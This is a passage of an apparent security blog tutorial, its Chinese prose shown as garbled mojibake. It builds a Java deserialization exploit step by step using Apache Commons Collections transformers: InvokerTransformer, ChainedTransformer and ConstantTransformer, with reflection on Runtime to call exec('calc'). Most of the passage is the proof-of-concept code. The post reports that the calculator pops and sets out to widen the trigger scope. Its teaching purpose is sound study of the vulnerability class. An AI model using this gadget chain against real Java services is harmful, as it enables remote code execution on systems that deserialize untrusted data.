<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731192120814.png" alt="image-20210731192120814" loading="lazy"></p>
<p>è®©æˆ‘ä»¬æ¥æ¨¡æ‹Ÿä¸€ä¸‹å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼š</p>
<p><strong>POC</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransformedMapExploit</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>

        <span class="token comment">/*
        * å®¢æˆ·ç«¯æ„é€ payloadï¼Œå¹¶åºåˆ—åŒ–æ–‡ä»¶
        * */</span>
        <span class="token comment">//é¦–å…ˆåˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
        <span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//åºåˆ—åŒ–</span>
        <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"tm.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*
        * æœåŠ¡ç«¯ååºåˆ—åŒ–è¯»å–ï¼Œå¹¶æ‰§è¡Œpayload
        * */</span>
        <span class="token comment">//ååºåˆ—åŒ–</span>
        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"tm.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">InvokerTransformer</span> inv <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvokerTransformer</span><span class="token punctuation">)</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//æ„é€ input - è¿™é‡Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªRuntime Objectï¼Œ ç”¨Runtime.getRuntime()çš„è¿”å›å€¼å¯ä»¥å¾—åˆ°</span>
        <span class="token class-name">Object</span> input <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//æ‰§è¡Œpayload</span>
        inv<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘ä»¬è¿è¡Œä¸€ä¸‹ï¼ŒæˆåŠŸå¼¹å‡ºäº†è®¡ç®—å™¨ï¼</p>
<p>ä½†æ˜¯ï¼Œæˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ï¼Œè¿™æ ·å†™å‡ºæ¥çš„POCæœ‰ä»€ä¹ˆé™åˆ¶ï¼š</p>
<blockquote>
<p>æœåŠ¡ç«¯çš„å¼€å‘äººå‘˜éœ€è¦â€œå¸®åŠ©â€æˆ‘ä»¬åšä»¥ä¸‹äº‹æƒ…ï¼Œæ‰èƒ½è§¦å‘æ¼æ´ï¼š</p>
<ul>
<li>æŠŠååºåˆ—åŒ–åçš„Objectå¼ºåˆ¶è½¬åŒ–ä¸ºInvokerTransformerç±»å‹</li>
<li>æ„é€ Input - Runtimeå®ä¾‹</li>
<li>æ‰§è¡ŒInvokerTransformerä¸­çš„transformæ–¹æ³•ï¼Œå¹¶å°†Runtimeå®ä¾‹ä»¥æ–¹æ³•å‚æ•°ä¼ å…¥ã€‚</li>
</ul>
</blockquote>
<p>å¯ä»¥è¯´è¿™æ ·çš„POCåŸºæœ¬æ— æ³•ç”¨äºç°å®ä¸­çš„Javaåº”ç”¨é‡Œï¼Œæ¯«æ— æ„ä¹‰ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆæ”¹é€ å‘¢ï¼Ÿ</p>
<h4 id="ç¬¬äºŒæ­¥ï¼šChainedTransformer"><a href="#ç¬¬äºŒæ­¥ï¼šChainedTransformer" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šChainedTransformer"></a>ç¬¬äºŒæ­¥ï¼šChainedTransformer</h4><p>é¦–å…ˆæ¥è§£å†³<code>input</code>çš„é—®é¢˜ï¼Œæˆ‘ä»¬æƒ³è¦è‡ªå·±æ¥å†™<code>input</code>ï¼Œè¿™æ ·æœ‰æ›´å¤šçš„è‡ªä¸»æ€§ã€‚è€Œ<code>ChainedTransformer</code>ç±»å°±æ»¡è¶³æˆ‘ä»¬çš„è¦æ±‚ã€‚æ­£å¦‚å…¶åï¼Œå®ƒæœ‰ç€æŠŠå„ä¸ª<code>transformer</code>ä¸²èµ·æ¥çš„åŠŸèƒ½ã€‚</p>
<p>åœ¨<code>ChainedTransformer</code>ä¸­ï¼Œæœ‰è¿™æ ·ä¸€ä¸ªmethodï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Object</span> object<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iTransformers<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           object <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iTransformers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
       <span class="token keyword">return</span> object<span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å®ƒå¾ªç¯éå†äº†<code>iTransformers</code>ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´  - æ¯ä¸€æ¬¡å¾ªç¯ï¼Œå®ƒéƒ½ä¼šæŠŠ<code>è¯¥å…ƒç´ .transform(object)</code>çš„ç»“æœï¼ˆä¸€ä¸ªå¯¹è±¡ï¼‰èµ‹å€¼ç»™<code>object</code>ï¼Œå¹¶è¿”å›ã€‚</p>
<p>è¿™æ„å‘³ç€ï¼Œä¸‹ä¸€ä¸ªå…ƒç´ æ‰§è¡Œçš„<code>transform()</code>æ–¹æ³•ä¸­çš„å‚æ•°å°±æ˜¯ä¸Šä¸€ä¸ªå…ƒç´ æ‰§è¡Œ<code>transform()</code>æ–¹æ³•çš„è¿”å›å€¼ã€‚</p>
<p>è€Œåœ¨<code>ChainedTransformer</code>çš„æ„é€ å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>iTransformers</code>å˜é‡ï¼ˆ<code>Transformer[]</code>ç±»å‹ï¼‰ï¼Œå› ä¸º<code>InvokerTransformer implements Transformer</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹‹å‰çš„<code>InvokerTransformer</code>ä¹Ÿå¯æ”¾åœ¨<code>Transformer[]</code>ä¸­ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>iTransformers <span class="token operator">=</span> transformers<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>æ‰€ä»¥æ„æƒ³ï¼šè®©æˆ‘ä»¬æ„é€ çš„<code>input</code>(Runtimeå®ä¾‹)ä½œä¸ºç¬¬ä¸€ä¸ªéå†å…ƒç´ çš„è¿”å›å€¼ï¼Œå†æ‰§è¡Œç¬¬äºŒä¸ªå…ƒç´ çš„transformæ—¶ï¼Œåˆšå¥½å°±ä¼ å…¥äº†inputè¿™ä¸ªå‚æ•°äº†ã€‚</p>
<p>ä½†é—®é¢˜æ˜¯ï¼Œæ€ä¹ˆè®©æˆ‘ä»¬æ„é€ çš„<code>input</code>(Runtimeå®ä¾‹)èƒ½è¢«<code>Transformer</code>ç±»æˆ–å…¶å­ç±»çš„<code>transform()</code>æ–¹æ³•ä¸­çš„è¿”å›å‘¢ï¼Ÿ</p>
<h4 id="ç¬¬ä¸‰æ­¥ï¼šConstantTransformer"><a href="#ç¬¬ä¸‰æ­¥ï¼šConstantTransformer" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šConstantTransformer"></a>ç¬¬ä¸‰æ­¥ï¼šConstantTransformer</h4><p>æˆ‘ä»¬æ‰¾åˆ°äº†<code>ConstantTransformer</code>ç±»ï¼Œå®ƒæ˜¯å®ç°<code>Transformer</code>ç±»çš„ï¼Œå¯ä»¥è¢«æ”¾è¿›<code>Transformer[]</code>æ•°ç»„ã€‚åœ¨ç±»é‡Œï¼Œå®ƒæœ‰æˆ‘ä»¬æƒ³è¦çš„<code>transform()</code>æ–¹æ³•ï¼Œä¸”åˆšå¥½å°±è¿”å›äº†<code>iConstant</code>ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ„é€ å‡½æ•°ä¸­ä¼ å…¥<code>Runtime.getRuntime()</code>è¿™ä¸ªObjectã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Object</span> constantToReturn<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//Constructor -ã€‹æˆ‘ä»¬å¯ä»¥æ§åˆ¶iconstant</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>iConstant <span class="token operator">=</span> constantToReturn<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Object</span> input<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//è¿”å›iconstant</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iConstant<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™æ ·æˆ‘ä»¬çš„é“¾å°±å¯ä»¥è¿èµ·æ¥äº†ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransformedMapExploit</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/*
        * å®¢æˆ·ç«¯æ„é€ payloadï¼Œå¹¶åºåˆ—åŒ–æ–‡ä»¶
        * */</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token comment">//è¿”å›input(Runtimeå®ä¾‹)ï¼Œå¹¶å°†å®ƒä½œä¸ºä¸‹é¢çš„transform()çš„æ–¹æ³•å‚æ•°ä¼ å…¥</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//åˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token comment">//å°†ä¸Šé¢çš„æ•°ç»„ç”¨chainedTransformerä¸²èµ·æ¥ï¼Œæ•°ç»„é‡Œçš„transformerä¼šè¢«æŒ¨ä¸ªæ‰§è¡Œtransform()æ–¹æ³•</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//åºåˆ—åŒ–</span>
        <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"tm.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*
        * æœåŠ¡ç«¯ååºåˆ—åŒ–è¯»å–ï¼Œå¹¶è§¦å‘æ¼æ´
        * */</span>
        <span class="token comment">//ååºåˆ—åŒ–</span>
        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"tm.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ChainedTransformer</span> inv <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ChainedTransformer</span><span class="token punctuation">)</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//è§¦å‘æ¼æ´</span>
        inv<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token string">"Leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œä»»ä½•å€¼éƒ½å¯ä»¥,å› ä¸ºConstantTransformer.transform(object)ä¸­çš„objectä¸­æ²¡æœ‰è¢«ç”¨åˆ°</span>

    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>åŸæœ¬æƒ³è¦çš„è®¡ç®—å™¨æ²¡æœ‰å‡ºç°ï¼Œå‡ºç°äº†é”™è¯¯ï¼šç¼–è¯‘å™¨æç¤º<code>Runtime</code>æ²¡æœ‰å®ç°<code>Serializable</code>ï¼Œæ‰€ä»¥ä¸èƒ½è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731202443280.png" alt="image-20210731202443280" loading="lazy"></p>
<p>é‚£æˆ‘ä»¬å°±é‡‡ç”¨åå°„çš„æ–¹æ³•æ¥è·å–Runtimeå®ä¾‹ï¼Œè®©æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ç”ŸæˆRuntimeå®ä¾‹ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransformedMapExploit</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/*
        * å®¢æˆ·ç«¯æ„é€ payloadï¼Œå¹¶åºåˆ—åŒ–æ–‡ä»¶
        * */</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//è¿”å›Runtime Class</span>
                <span class="token comment">//è·å–getRuntimeæ–¹æ³•</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//call getRuntimeæ–¹æ³•å¾—åˆ°Runtimeå®ä¾‹</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//åˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token comment">//å°†ä¸Šé¢çš„æ•°ç»„ç”¨chainedTransformerä¸²èµ·æ¥ï¼Œæ•°ç»„é‡Œçš„transformerä¼šè¢«æŒ¨ä¸ªæ‰§è¡Œtransform()æ–¹æ³•</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//åºåˆ—åŒ–</span>
        <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"tm.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*
        * æœåŠ¡ç«¯ååºåˆ—åŒ–è¯»å–ï¼Œå¹¶è§¦å‘æ¼æ´
        * */</span>
        <span class="token comment">//ååºåˆ—åŒ–</span>
        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"tm.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ChainedTransformer</span> inv <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ChainedTransformer</span><span class="token punctuation">)</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//è§¦å‘æ¼æ´</span>
        inv<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token string">"Leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œä»»ä½•å€¼éƒ½å¯ä»¥</span>

    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼ä½†è¿™æ ·æ¼æ´å¯ä»¥è§¦å‘çš„èŒƒå›´ä¾ç„¶ä¸å¤§ï¼Œä»éœ€è¦å¼€å‘è€…åœ¨æœåŠ¡ç«¯å°†objectè½¬æ¢ä¸º<code>ChainedTransformer</code>ç±»å‹ï¼Œä¸”æ‰§è¡Œ<code>transform</code>æ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦æ‰©å¤§æ¼æ´è§¦å‘èŒƒå›´ã€‚</p>
